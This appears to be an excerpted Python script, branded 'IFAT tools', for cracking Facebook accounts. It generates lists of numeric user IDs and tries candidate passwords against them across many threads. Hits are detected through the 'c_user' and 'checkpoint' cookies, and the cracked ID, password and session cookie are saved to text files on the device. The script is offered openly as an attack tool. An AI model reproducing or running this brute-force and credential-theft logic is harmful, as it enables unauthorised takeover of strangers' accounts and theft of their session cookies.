...
redmi=[]
try:
 print('\033[32;1m𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐈𝐅𝐀𝐓 𝐭𝐨𝐨𝐥𝐬')
...
def banner():
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} 𝐈𝐅𝐀𝐓                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Mahin Ahmed             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801623689004          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/FB-𝐈𝐅𝐀𝐓{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   ...
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐈𝐅𝐀𝐓 𝐭𝐨𝐨𝐥𝐬{P}
 {K}[{H}√{K}]{P} 𝐓𝐡𝐢𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐢𝐬 𝐟𝐨𝐫 𝐦𝐲 𝐡𝐚𝐭𝐞𝐫𝐬
 {K}[{H}√{K}]{P}       {H} 𝐓𝐡𝐞 𝐈𝐅𝐀𝐓 𝐈𝐒 𝐁𝐀𝐂𝐊
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     print(f'{gen}{RED}Exited {H}FB-𝐈𝐅𝐀𝐓{P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.𝐈𝐅𝐀𝐓.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.𝐈𝐅𝐀𝐓.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.𝐈𝐅𝐀𝐓.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as 𝐈𝐅𝐀𝐓_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:𝐈𝐅𝐀𝐓_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:𝐈𝐅𝐀𝐓_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:𝐈𝐅𝐀𝐓_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
            else:
               𝐈𝐅𝐀𝐓_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as 𝐈𝐅𝐀𝐓_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:𝐈𝐅𝐀𝐓_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:𝐈𝐅𝐀𝐓_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:𝐈𝐅𝐀𝐓_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      else:
       𝐈𝐅𝐀𝐓_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as 𝐈𝐅𝐀𝐓_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:𝐈𝐅𝐀𝐓_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:𝐈𝐅𝐀𝐓_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-𝐈𝐅𝐀𝐓.py')
...
def x6():
  ...
  with tred(max_workers=30) as 𝐈𝐅𝐀𝐓_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:𝐈𝐅𝐀𝐓_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:𝐈𝐅𝐀𝐓_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:𝐈𝐅𝐀𝐓_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
...
def xp():
  ...
  with tred(max_workers=30) as 𝐈𝐅𝐀𝐓_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:𝐈𝐅𝐀𝐓_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:𝐈𝐅𝐀𝐓_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:𝐈𝐅𝐀𝐓_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:𝐈𝐅𝐀𝐓_xd.submit(f1,idf,pwv)
      else:
       𝐈𝐅𝐀𝐓_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-𝐈𝐅𝐀𝐓.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91m𝐈𝐅𝐀𝐓","\x1b[1;92m𝐈𝐅𝐀𝐓","\x1b[1;93m𝐈𝐅𝐀𝐓","\x1b[1;94m𝐈𝐅𝐀𝐓","\x1b[1;95m𝐈𝐅𝐀𝐓","\x1b[1;96m𝐈𝐅𝐀𝐓","\x1b[1;97m𝐈𝐅𝐀𝐓","\x1b[1;91m𝐈𝐅𝐀𝐓","\x1b[1;92m𝐈𝐅𝐀𝐓","\x1b[1;93m𝐈𝐅𝐀𝐓","\x1b[1;94m𝐈𝐅𝐀𝐓","\x1b[1;95m𝐈𝐅𝐀𝐓","\x1b[1;96m𝐈𝐅𝐀𝐓"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30m𝐈𝐅𝐀𝐓-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/𝐈𝐅𝐀𝐓-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}𝐈𝐅𝐀𝐓-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/𝐈𝐅𝐀𝐓-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30m𝐈𝐅𝐀𝐓-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/𝐈𝐅𝐀𝐓-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/𝐈𝐅𝐀𝐓-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [𝐈𝐅𝐀𝐓-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/𝐈𝐅𝐀𝐓-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30m𝐈𝐅𝐀𝐓-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/𝐈𝐅𝐀𝐓-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
